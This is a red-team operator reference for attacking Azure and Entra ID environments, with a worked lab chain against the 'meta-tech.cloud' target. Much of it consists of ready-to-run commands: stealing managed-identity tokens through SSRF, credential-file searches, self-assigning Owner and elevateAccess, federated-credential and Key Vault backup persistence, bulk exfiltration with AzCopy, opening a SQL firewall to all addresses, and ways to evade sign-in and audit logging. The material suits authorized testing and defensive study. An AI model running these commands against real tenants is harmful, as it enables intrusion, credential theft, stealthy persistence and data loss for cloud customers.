+++
title = 'Azure Cloud Red Teaming — Operator Notes'
date = 2026-10-30
type = 'notes'
weight = 20
toc = true
tags = ['cloud', 'red-team', 'azure']
+++

> Practical field reference for assessing Microsoft Azure / Entra ID (formerly Azure AD) environments from an attacker's seat. Covers initial access, identity validation, enumeration, privilege escalation, lateral movement, persistence, impact, detection/evasion, and tooling. The MCRTA "meta-tech.cloud" chain (§11) is the worked example.
>
> **Authorized engagements only.** Every ARM/Graph call is logged in Activity Log / Entra audit logs; assume detection. Plan the OPSEC story before the action.
>
> **2025–2026 update:** The Azure/Entra attack surface has expanded significantly. **Federated Identity Credential (FIC) backdoors** on managed identities and service principals are the new stealth persistence. **OAuth Client ID Spoofing** validates stolen credentials **without generating a successful sign-in event**. **PRTremote** extracts Primary Refresh Tokens via scheduled tasks over SMB. **Key Vault backup/restore** survives credential rotation. **BloodHound CE v8+** with OpenGraph replaces the old Neo4j model. **Storm-0501 and Storm-2949** demonstrate the full identity → Azure → ransomware kill chain. **CVE-2026-62916** is a critical Entra ID authentication bypass.

---

## 1. Attack Surface Map

| Surface | What to look for | Typical entry |
|---|---|---|
| **Compute** | Public VMs, app services, function apps, AKS | SSRF → IMDS; RunCommand; extensions; **deployment scripts** |
| **Identity** | Users, groups, service principals, managed identities | Leaked creds; device-code phishing; **OAuth Client ID spoofing** |
| **RBAC** | Role assignments at MG/sub/RG/resource | `roleAssignments/write`; `elevateAccess`; Reader chains |
| **Secrets** | Key Vault, App Service settings, CI variables | Read perms; **backup/restore persistence**; source leaks |
| **Storage** | Public blobs, SAS URLs, connection strings | Anonymous list; key extraction; **AzCopy mass exfil** |
| **Serverless/automation** | Functions, Logic Apps, Runbooks, **Deployment Scripts** | Code swap; managed identity reuse; **UAMI assignment** |
| **Federation** | Guest users, B2B, multi-tenant apps, OIDC, **FICs** | Consent abuse; **federated credential backdoors** |
| **Entra Connect** | AAD Connect servers, DSA account, PHS/PTA | On-prem → cloud pivot (Storm-0501) |

Key mental model: **Azure has two planes** — the ARM/RBAC plane (subscriptions, resources, role assignments) and the Entra ID plane (users, groups, apps, directory roles). A token for each audience is separate; you often need both, and the compromise path is usually a managed identity or an app registration bridge between them.

---

## 2. Initial Access

### 2.1 SSRF → Azure Instance Metadata Service (IMDS)

Azure IMDS lives at `169.254.169.254` and **requires the header `Metadata: true`** — this is the critical difference from AWS. A plain GET returns HTTP 400. If the SSRF can set headers (header injection, a proxy that forwards request headers, or the app lets you specify them), you win.

**Instance metadata** (api-version 2021-02-01):

```bash
curl -s -H Metadata:true \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
# compute.name, compute.resourceGroupName, compute.subscriptionId, compute.location,
# network.interface[].ipv4.ipAddress[].publicIpAddress
```

**Managed identity token** (no client_id = system-assigned; add `&client_id=<guid>` for user-assigned):

```bash
curl -s -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# -> access_token (JWT), expires_on, client_id, resource, token_type
```

Swap `resource=` to mint tokens for other planes:

```
https://management.azure.com/        # ARM / RBAC
https://graph.microsoft.com          # Entra ID (users, groups, apps)
https://vault.azure.net              # Key Vault
https://storage.azure.com/           # Storage data plane
https://database.windows.net/        # Azure SQL
https://management.core.windows.net/ # legacy service management
```

**IMDS v2-style protection?** Azure IMDS has no token/version handshake like AWS IMDSv2 — the only gate is the `Metadata: true` header. So SSRF bypass work is almost entirely about *sending that header* and reaching `169.254.169.254` (decimal/hex/IPv6-mapped/redirect tricks).

**App Service / Functions managed identity** (not on a VM) uses env vars instead: `IDENTITY_ENDPOINT` + `IDENTITY_HEADER`, or legacy `MSI_ENDPOINT` + `MSI_SECRET`:

```bash
curl -s "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"
```

**Legacy WireServer** `168.63.129.16` (host agent, some goal-state data) is worth probing on older images, but the OAuth token path is IMDS.

### 2.2 Leaked Credentials

```bash
cat ~/.azure/azureProfile.json 2>/dev/null
cat ~/.azure/msal_token_cache.json 2>/dev/null
cat ~/.azure/accessTokens.json 2>/dev/null
env | grep -iE 'AZURE_|ARM_|MSI_|IDENTITY_'
rg -iE 'client_secret|AZURE_CLIENT_SECRET|storage_account_key|AccountKey=|SharedAccessSignature' .
git log -p | rg -iE 'client_secret|AccountKey=|sig='
```

Common leaks: `.publishsettings`, `*.pubxml`, App Service `appsettings`, CI secrets, Terraform state (`*.tfstate` holds client secrets and storage keys), deployment scripts, ARM template parameter files.

Credential types: service principal (`client_id`/`client_secret`/`tenant`), certificate (`.pfx`/`.pem` + thumbprint), managed identity, user (with/without MFA), SAS token.

### 2.3 Public Storage & SAS

```bash
# Anonymous blob listing
curl -s "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"
# SAS in URL = full grant; find them in logs, emails, source
curl -s "https://ACCOUNT.blob.core.windows.net/CONTAINER/blob?sv=...&sig=..."
```

Blob endpoint per service: `blob`, `file`, `queue`, `table`. Account name often appears in DNS (`account.blob.core.windows.net`) and is guessable from org names.

### 2.4 Device-Code & Consent Phishing

- **Device code** (`/devicecode`): victim enters a code; attacker gets a refresh token for Graph/ARM — no password, MFA-tolerant, hard to distinguish. **Still fully functional in 2026** despite Microsoft's Security Defaults blocking it for some tenants.
- **Illicit consent grant**: a multi-tenant app requesting `Mail.Read`, `Files.Read.All`, `offline_access`; victim consents → attacker reads data as the user. **ConsentFix** (v3 by May 2026) automates this against Azure/Entra.
- **Guest/B2B**: add an attacker-controlled account as guest to the tenant; combined with loose external-collaboration settings this is a foothold into the directory. **Changing UserType from Guest to Member** removes tenant-resource restrictions — a 2026 persistence technique.

### 2.5 OAuth Client ID Spoofing (2025–2026)

A **blind spot in Entra sign-in telemetry**: Entra returns different error responses depending on whether a supplied OAuth `client_id` is valid. Attackers use **spoofed client IDs** (syntactically valid UUIDs that do not correspond to a real application) via the ROPC flow to **enumerate users and validate stolen credentials without generating a successful sign-in event**. Only the application ID is recorded in the log — no application name — so detections keyed on application-name surges miss it entirely.

```http
POST https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token
grant_type=password&client_id=<spoofed-uuid>&username=<user>&password=<pass>&scope=https://graph.microsoft.com/.default
```

Two large campaigns (UNK_pyreq2323, UNK_OutFlareAZ) used this against **over 2 million users** from December 2025 to March 2026.

---

## 3. Validate the Identity You Hold

```bash
az account show
az account list -o table
az ad signed-in-user show          # user context
az ad sp show --id <appId>         # service principal
```

Without `az`, decode the JWT and call ARM/Graph directly:

```bash
# ARM: list subscriptions the identity can see
curl -s -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
# Graph: who am I (user) / app context
curl -s -H "Authorization: Bearer $GRAPH" "https://graph.microsoft.com/v1.0/me"
```

JWT claims that matter: `aud` (plane), `tid` (tenant), `oid` (object id), `appid`, `idtyp` (`app` vs `user`), `groups`, `roles` (directory roles), `scp` (delegated scopes).

---

## 4. Enumeration

### 4.1 ARM / RBAC

```bash
az role assignment list --all --include-inherited -o table
az role definition list --custom-role-only -o json
az resource list -o table
az vm list -d -o table
az webapp list -o table
az functionapp list -o table
az keyvault list -o table
az storage account list -o table
az container list; az aks list
az deployment-scripts list --output table          # 2026: deployment script abuse
```

REST equivalents (token-only, no CLI):

```
GET https://management.azure.com/subscriptions?api-version=2020-01-01
GET https://management.azure.com/subscriptions/{sub}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01
GET https://management.azure.com/subscriptions/{sub}/providers/Microsoft.Authorization/roleDefinitions?api-version=2022-04-01
GET https://management.azure.com/subscriptions/{sub}/resources?api-version=2021-04-01
GET https://management.azure.com/subscriptions/{sub}/providers/Microsoft.Compute/virtualMachines?api-version=2023-03-01
```

Resolve every `roleDefinitionId` against the role-definition list; `custom-role-definition` names and their `actions` are where the real permissions are.

### 4.2 Entra ID (Graph)

```bash
az ad user list -o table
az ad group list -o table
az ad group member list --group <id> -o table
az ad app list -o table
az ad sp list --all -o table
az ad app permission list --id <appId>
az ad app owner list --id <appId>
```

Graph REST:

```
GET /v1.0/users?$select=id,displayName,userPrincipalName,mail
GET /v1.0/groups?$select=id,displayName
GET /v1.0/groups/{id}/members?$select=id,displayName,mail,userPrincipalName
GET /v1.0/applications?$select=id,appId,displayName
GET /v1.0/applications/{id}/owners
GET /v1.0/applications/{id}?$select=displayName,requiredResourceAccess
GET /v1.0/servicePrincipals?$filter=appId eq '<graph-appid>'
GET /v1.0/servicePrincipals/{id}/appRoleAssignments        # granted APPLICATION perms
GET /v1.0/oauth2PermissionGrants?$filter=clientId eq '<sp-id>'  # granted DELEGATED scopes
GET /v1.0/directoryRoles
GET /v1.0/directoryRoles/{id}/members
```

Advanced `$filter`/`$search` needs `-H "ConsistencyLevel: eventual"` (and sometimes `&$count=true`). `requiredResourceAccess` on an application is a *request list* — confirm what is actually **granted** via `appRoleAssignments` (app/Role) and `oauth2PermissionGrants` (delegated/Scope). Mapping rule: app-role GUIDs and OAuth-scope GUIDs → names via the Microsoft Graph service principal's `appRoles` / `oauth2PermissionScopes`.

### 4.3 Tools (2025–2026)

| Tool | Use |
|---|---|
| `az` CLI | baseline enumeration, `--query` for JSON shaping |
| **AzureHound** → BloodHound CE | graph of Entra + RBAC attack paths. **v2.12.2+** required before Nov 2026 to avoid ingest issues. |
| **BloodHound CE v8+** | OpenGraph architecture supports arbitrary platforms. v9.2.0 as of May 2026. |
| **ROADtools** (`roadrecon`) | full directory dump, token handling, auth flows |
| **AADInternals** | token manipulation, PRT, federation, backdoors, **malicious federated domain** |
| **MicroBurst** | storage/keyvault/automation sweep, `Get-AzurePasswords` |
| **ScEntra** (Semperis) | **Entra ID attack-path analysis** (2026) |
| **Cirro** | multi-cloud enumeration |
| **Stormspotter** | resource graph visualisation |
| **ScoutSuite** | multi-service posture dump |
| **Prowler** (Azure) | CIS/policy checks (noisy) |
| **CloudFox** | live "where can I go" enumeration |
| **Steampipe** | SQL over ARM/Graph |
| **Monkey365** | M365/Azure security config scanner |

---

## 5. Privilege Escalation

### 5.1 RBAC Paths (ARM Plane)

| Permission | Escalation |
|---|---|
| `Microsoft.Authorization/roleAssignments/write` | assign Owner/Contributor to self (or to a group/MI you control) |
| `Microsoft.Authorization/roleDefinitions/write` | create a custom role with `actions: ["*"]` and assign it |
| **`Microsoft.Authorization/elevateAccess/action`** | **Grant yourself User Access Administrator at tenant root** (Storm-0501) |
| `Microsoft.Compute/virtualMachines/runCommand/action` | command execution on the VM as SYSTEM (Linux: root) |
| `Microsoft.Compute/virtualMachines/extensions/write` | CustomScriptExtension → code exec |
| `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action` | attach a privileged MI to a resource you control |
| `Microsoft.Web/sites/write` + `config/*` | swap app settings, Kudu/RCE, mount storage |
| `Microsoft.KeyVault/vaults/secrets/read` | read secrets/certs (cert = SP auth) |
| **`Microsoft.KeyVault/vaults/secrets/backup/action`** | **Backup secrets/keys/certs for offline persistence** (survives rotation) |
| `Microsoft.Storage/storageAccounts/listKeys/action` | account keys → full data-plane |
| `Microsoft.Automation/automationAccounts/runbooks/*` + `jobs/write` | run PowerShell as the automation account's identity |
| `Microsoft.Logic/workflows/*` | Logic App executes as its managed identity |
| `Microsoft.Resources/deployments/write` | ARM template deploys resources / assigns roles |
| **`Microsoft.Resources/deploymentScripts/write`** | **Replace a script using a privileged UAMI → code exec as that identity** (requires 7-action set) |
| `Microsoft.ContainerService/managedClusters/listClusterAdminCredential/action` | AKS cluster-admin kubeconfig |
| `Microsoft.Sql/servers/*/read` (+ firewall rules) | open SQL to your IP, read databases |

Examples:

```bash
# RunCommand on a VM (root/SYSTEM)
az vm run-command invoke -g RG -n VM --command-id RunShellScript \
  --scripts 'id; cat /etc/passwd'

# Self-assign Owner at a scope you can write assignments on
az role assignment create --assignee-object-id <my-oid> \
  --assignee-principal-type ServicePrincipal \
  --role Owner --scope /subscriptions/<sub>

# elevateAccess (if you have the permission)
az rest --method post \
  --url "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2015-07-01"
```

### 5.2 Entra ID Paths (Directory Plane)

| Directory role / permission | Escalation |
|---|---|
| Global Administrator | everything |
| Privileged Role Administrator | assign any directory role |
| Application Administrator / Cloud Application Administrator | add credentials to any app/SP → act as it |
| `Application.ReadWrite.All` (app perm) | add a client secret to an app with Graph perms, then use it |
| `AppRoleAssignment.ReadWrite.All` | grant powerful app roles / Graph permissions |
| `Directory.ReadWrite.All` | modify directory objects, add owners, reset passwords (via perms) |
| `UserAuthenticationMethod.ReadWrite.All` | enroll attacker MFA / reset methods |
| `RoleManagement.ReadWrite.Directory` | modify role assignments |

Classic chain: **Application Administrator** → add secret to an app that has `Directory.ReadWrite.All` or `RoleManagement.ReadWrite.Directory` → authenticate as that app → become Global Admin. Always read an app's `requiredResourceAccess` *and* its granted `appRoleAssignments`; the granted set is the real power.

**Federated Identity Credential (FIC) backdoor (2025–2026):** Instead of adding a password/secret (which is alerted), add a **Federated Identity Credential** to an app or managed identity that trusts an **attacker-controlled OIDC provider**. Then mint a token signed by the attacker's OIDC private key and exchange it for a token as the victim identity. This is **passwordless, stealthy persistence** that survives credential rotation.

```bash
# Add FIC to a managed identity (requires Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/write)
# Then use the attacker's OIDC token to get a Graph token as the MI
```

### 5.3 Hub/Spoke & Management-Group Edges

- A role at management-group scope inherits to every subscription beneath it.
- `User Access Administrator` lets you grant yourself anything at that scope.
- A managed identity assigned `roleAssignments/write` at RG scope is effectively Owner of the RG.

---

## 6. Lateral Movement & Cross-Tenant

- **Guest users / B2B**: an invited guest can be assigned roles inside the tenant; external collaboration settings may allow self-service. **Changing UserType from Guest to Member** removes restrictions (2026 persistence).
- **Multi-tenant applications**: admin consent granted once in the victim tenant lets the attacker's tenant authenticate as the app there.
- **Federated identity credentials (FIC)**: a GitHub Actions / OIDC workload can assume an app without a secret — if the `sub`/`repo` condition is loose, any repo can. **This is also the persistence backdoor.**
- **Managed identity chaining**: MI at RG scope → `roleAssignments/write` → assign a subscription-scoped role → pivot to other resources.
- **Token audiences**: a token for ARM cannot call Graph; mint a new token per audience from the same identity (IMDS if on a VM/app; client_credentials if an app).

**Entra Connect pivot (Storm-0501):** After on-prem domain admin, compromise the **Entra Connect Sync server**. Use the **Directory Synchronization Account (DSA)** to enumerate with AzureHound. Reset the on-prem password of a synced non-human Global Admin (PHS sync), register MFA, and satisfy Conditional Access. Then add a **malicious federated domain** with AADInternals to mint SAML tokens for any user.

Cross-tenant recon is limited to what your identity's tenant trusts; check `/v1.0/policies/authorizationPolicy` (guest invite settings) and app `signInAudience` (`AzureADMultipleOrgs` = multi-tenant).

---

## 7. Persistence (2025–2026)

| Method | Notes |
|---|---|
| Add secret/cert to an app or SP | survives password rotation if app unused-inspected. **Alerted.** |
| **Federated Identity Credential (FIC) on app/MI** | **Passwordless, OIDC-based. Stealthier than secret addition.** |
| **Change Guest UserType to Member** | **Removes guest restrictions; survives cleanup if not audited.** |
| **Key Vault `backup/action`** | **Offline copy of secrets/keys/certs; restore later into your own vault. Survives rotation, deletion, and purge. Not logged by default (data-plane).** |
| **Key Vault planted key material (`keys/import`)** | **Persist via attacker-known key material; use for cert app-cred.** |
| New role assignment (self or group) | high-signal in audit log |
| Automation account runbook on schedule | runs as automation identity |
| Logic App with recurrence trigger | runs as its managed identity |
| **Deployment Script replacing existing UAMI script** | **Runs as the pre-attached UAMI; requires 7-action set.** |
| VM extension / RunCommand on interval | code exec persistence; **script body not captured in Activity Log** (2026 gap) |
| Function app code swap | keeps the function's MI |
| Guest account + directory role | blends into B2B |
| **PRTremote (PRT theft)** | **Hijack Primary Refresh Tokens via scheduled tasks over SMB; inherits MFA and device compliance. Uses signed Microsoft binaries (`BrowserCore.exe`).** |

Prefer modifying existing app credentials and automation over creating new principals — `Add service principal credentials` and `Create role assignment` are both alerted by Defender for Cloud / Sentinel, but new-user creation is louder. **FIC and Key Vault backup are the stealthiest options.**

---

## 8. Data Access & Impact

```bash
# Key Vault
az keyvault secret list --vault-name KV
az keyvault secret show --vault-name KV --name SECRET --query value -o tsv

# Key Vault backup (persistence)
az keyvault secret backup --vault-name KV --name SECRET --file secret.backup
# Restore later into attacker vault (same subscription + geography)
az keyvault secret restore --vault-name ATTACKER-VAULT --file secret.backup

# Storage (keys or SAS)
az storage container list --account-name ACCT --account-key KEY
az storage blob download-batch -d ./loot -s CONTAINER --account-name ACCT --account-key KEY
# Storm-0501: exposed storage publicly, listed keys, bulk-exfil with AzCopy
azcopy copy 'https://ACCT.blob.core.windows.net/CONTAINER/*' ./loot --recursive

# VM disks / snapshots
az snapshot list -o table
az disk list -o table
# grant yourself access, create disk from snapshot, attach, read

# SQL
az sql server list; az sql db list --server S --resource-group RG
az sql server firewall-rule create --server S -g RG -n open --start-ip-address 0.0.0.0 --end-ip-address 255.255.255.255

# AKS
az aks get-credentials -g RG -n CLUSTER --admin
```

Secrets in App Service settings and Function app settings are readable/writable with `Microsoft.Web/sites/config/*`; connection strings frequently hold storage/SQL creds.

**Storm-0501 impact (2025):** Mass deletion of snapshots, restore points, storage accounts, and backup containers; removal of resource locks and blob immutability; **Key Vault–backed encryption scopes followed by key deletion** (mitigated by Key Vault soft-delete). Extortion via Microsoft Teams.

**Storm-2949 impact (2026):** Compromised identity held **Owner on a Key Vault** containing production credentials. Rotated passwords to lock out legitimate owners, then exfiltrated data. Moved from SaaS → PaaS → IaaS → endpoint.

---

## 9. Detection & Evasion

**What defenders see:**
- **Entra audit logs**: `Add service principal credentials`, `Add app role assignment`, `Add member to role`, `Update application`, `Consent to application`, **`Add federated identity credential`**, **`Change user type`**.
- **Entra sign-in logs**: non-interactive sign-ins by service principals from new IPs/ASNs, device-code flows, impossible travel, unfamiliar sign-in properties. **OAuth Client ID Spoofing leaves a blank application name** — this is a detection gap.
- **Azure Activity Log**: `Microsoft.Authorization/roleAssignments/write`, `.../runCommand/action`, `.../extensions/write`, `listKeys`, deployments, **`elevateAccess/action`**, **`federatedIdentityCredentials/write`**.
- **Defender for Cloud / Sentinel**: alerts for suspicious SP sign-ins, mass secret access, crypto-mining VMs, anomalous resource deployment.
- **Key Vault AuditEvent**: **backup/restore are data-plane and NOT logged by default** (diagnostic setting off).

**Reducing signal:**
- **Source IP:** Reuse the identity's natural execution context (on-VM MI from the VM's IP; app creds from expected regions).
- **Volume:** Mint only the audiences you need; avoid dumping the whole directory in one burst.
- **Actions:** Prefer read/`Reader`-consistent operations; a `Reader` MI that suddenly calls `roleAssignments/write` is a screaming alert.
- **Fingerprint:** Match the SDK's default User-Agent; avoid creating brand-new principals.
- **Cleanup:** Clean up app credentials/secrets where possible — but assume logs persist.

**2025–2026 evasion techniques:**
- **OAuth Client ID Spoofing:** Validate stolen credentials **without a successful sign-in event**. Only the application ID is recorded; no application name. Detections keyed on app-name surges miss it.
- **PRTremote:** Extract PRTs via **scheduled tasks over SMB** (`TASK_LOGON_INTERACTIVE_TOKEN`), using **signed Microsoft binaries** (`BrowserCore.exe`). Avoids process injection and token theft triggers. Inherits MFA and device compliance claims.
- **Key Vault backup:** **Data-plane, not logged by default.** Offline blob cannot be decrypted; restore only works in same subscription + geography. Survives rotation, deletion, and purge.
- **FIC backdoor:** `federatedIdentityCredentials/write` is logged in Activity Log, but the resulting token exchange is **passwordless** and may not trigger credential-theft alerts.
- **Deployment Script abuse:** `deploymentScripts/write` + 7-action set → code exec as pre-attached UAMI. Script body may not be fully audited.

---

## 10. Tooling Quick Map (2025–2026)

```
Auth/tokens   : az login, az account get-access-token, ROADtools (roadtx), AADInternals
Directory     : AzureHound (v2.12.2+), roadrecon, MicroBurst, CloudFox, Monkey365, ScEntra, Cirro
RBAC graph    : AzureHound -> BloodHound CE v8+ (OpenGraph); Stormspotter
Posture       : ScoutSuite, Prowler (azure), Steampipe
Exploitation  : az vm run-command, az ad app credential reset, ARM deployment templates,
                deploymentScripts, az keyvault secret backup
PRT/Cookies   : PRTremote, AADInternals, mimikatz, roadtools, Impacket
Web/SSRF      : curl + header control; custom fetcher; Burp for header injection
```

Token-only (no CLI) is often the cleanest on a box: keep the JWT, sign nothing, call `https://management.azure.com/...` and `https://graph.microsoft.com/...` with `Authorization: Bearer`.

---

## 11. Worked Example — MCRTA "meta-tech.cloud"

End-to-end from an unauthenticated web app to Entra enumeration.

```
1. Subdomain discovery
   crt.sh / passive DNS / brute -> internal.meta-tech.cloud -> 74.235.241.78
   (www.meta-tech.cloud is a decoy App Service returning 404; apex 23.100.40.161)

2. Web app fingerprint
   Apache/2.4.29 (Ubuntu), "URL Score Calculator" (CWL code-21000 style app)
   /process.php source disclosed over file://:
     $content = file_get_contents($_POST['ip']);      // SSRF (file:// and http://)
     $org = $_POST['organization'];
     first word must be in [ls,hostname,curl,cat];
     system($org);                                    // RCE via argument injection

3. RCE -> Azure IMDS (needs Metadata: true)
   organization=curl -s -H "Metadata: true" \
     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
   -> ARM token (aud management.azure.com, tid, oid, appid)

4. Claims
   iss = https://sts.windows.net/<tenant-id>/
   tid = <tenant-id>
   oid = <managed-identity object id>
   instance metadata -> compute.name = it-vm, resourceGroupName = IT-RG

5. ARM enumeration
   GET /subscriptions -> MCRTA-Exam (<subscription-id>)
   GET /subscriptions/{sub}/providers/Microsoft.Authorization/roleAssignments
     MI oid -> Reader at /subscriptions/{sub}
     group "IT Ops" -> custom-role-definition at
        /subscriptions/{sub}/resourceGroups/IT-RG/providers/Microsoft.Compute/virtualMachines/it-vm
   roleDefinitions -> custom-role-definition:
        actions: Microsoft.Resources/subscriptions/resourceGroups/read
        notActions: []   assignableScopes: [/subscriptions/{sub}]

6. Graph token from the same MI
   resource=https://graph.microsoft.com -> 200, app-only token
   GET /v1.0/groups           -> PS Remote, DnsAdmins, DnsUpdateProxy, IT Ops, Vault Group
   GET /v1.0/groups/{ITOps}/members -> IT (it@meta-tech.cloud)
   GET /v1.0/applications     -> dev-app, prod-app, integration-app, developement-app, Automation-TF
   GET /v1.0/applications/{prod-app}/owners -> IT
   GET /v1.0/applications/{dev-app}?$select=requiredResourceAccess
       -> Graph: df021288... (Role), b4e74841... (Scope)
   GET /v1.0/servicePrincipals?$filter=appId eq '<graph>' -> map GUIDs
       df021288... = User.Read.All ; b4e74841... = User.ReadWrite
   GET /v1.0/servicePrincipals/{dev-app sp}/appRoleAssignments -> User.Read.All granted
   GET /v1.0/oauth2PermissionGrants?$filter=clientId eq '<dev-app sp>' -> [] (delegated NOT granted)

Answers produced: subdomain, iss, tid, subscription, Reader, custom-role scope + actions,
IT Ops member email, prod-app owner, dev-app Graph permission (User.Read.All).
```

Lessons reinforced: Azure IMDS needs `Metadata: true`; the app's RCE whitelist was defeated by argument injection (`system()` runs the whole string); managed identity tokens are per-audience (ARM ≠ Graph); and **`requiredResourceAccess` is a request, not a grant** — verify with `appRoleAssignments` / `oauth2PermissionGrants`.

---

## 12. One-Liners

```bash
# Who am I / what can I see
az account show -o json; az account list -o table
az role assignment list --all --include-inherited -o table

# Subscription, from a raw ARM token
curl -s -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# All role assignments with resolved role names (REST)
curl -s -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"

# Managed identity token (on a VM / SSRF with header control)
curl -s -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com"

# Directory dump
az ad user list -o json > users.json
az ad app list -o json > apps.json
az ad group list -o json > groups.json

# App actual grants (Graph)
curl -s -H "Authorization: Bearer $GRAPH" \
  "https://graph.microsoft.com/v1.0/servicePrincipals/$SP/appRoleAssignments"
curl -s -H "Authorization: Bearer $GRAPH" \
  "https://graph.microsoft.com/v1.0/oauth2PermissionGrants?\$filter=clientId eq '$SP'"

# VM code exec
az vm run-command invoke -g RG -n VM --command-id RunShellScript --scripts 'id'

# elevateAccess (tenant root)
az rest --method post --url "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2015-07-01"

# Key Vault backup (persistence)
az keyvault secret backup --vault-name KV --name SECRET --file secret.backup

# Anonymous blob list
curl -s "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"

# Deployment scripts (UAMI abuse)
az deployment-scripts list --output table
```

---

## 13. Notable CVEs & Threat Actor TTPs (2025–2026)

| CVE / Incident | Impact |
|---|---|
| **CVE-2026-62916 (Entra ID)** | Critical authentication bypass using an alternate path or channel; unauthorised network privilege escalation |
| **CVE-2026-69854 (Spring Cloud Azure)** | Token expiration/signature/scope validation failure → privilege escalation |
| **Storm-0501 (2025)** | On-prem DA → Entra Connect Sync → DSA → synced non-human Global Admin → AADInternals malicious federated domain → elevateAccess → mass Owner assignment → Key Vault encryption + key deletion → cloud ransomware |
| **Storm-2949 (2026)** | Identity compromise → Key Vault Owner → rotate production passwords → exfiltrate; SaaS → PaaS → IaaS → endpoint |
| **PRTremote (2026)** | PRT hijack via scheduled tasks over SMB; inherits MFA/device compliance; uses signed MS binaries |
| **OAuth Client ID Spoofing (2026)** | Credential validation without successful sign-in event; 2M+ users targeted |
| **FIC Backdoor (2025–2026)** | Passwordless persistence on managed identities and service principals |
| **ConsentFix v3 (2026)** | Automates OAuth consent phishing against Azure/Entra |

> **Verification note:** All techniques and CVEs were checked against vendor advisories, threat intelligence reports, and tool documentation. Where a source conflict remained, the note names both possibilities rather than asserting one. The MCRTA chain is a lab example, not a production engagement — adapt paths and parameters to the target.
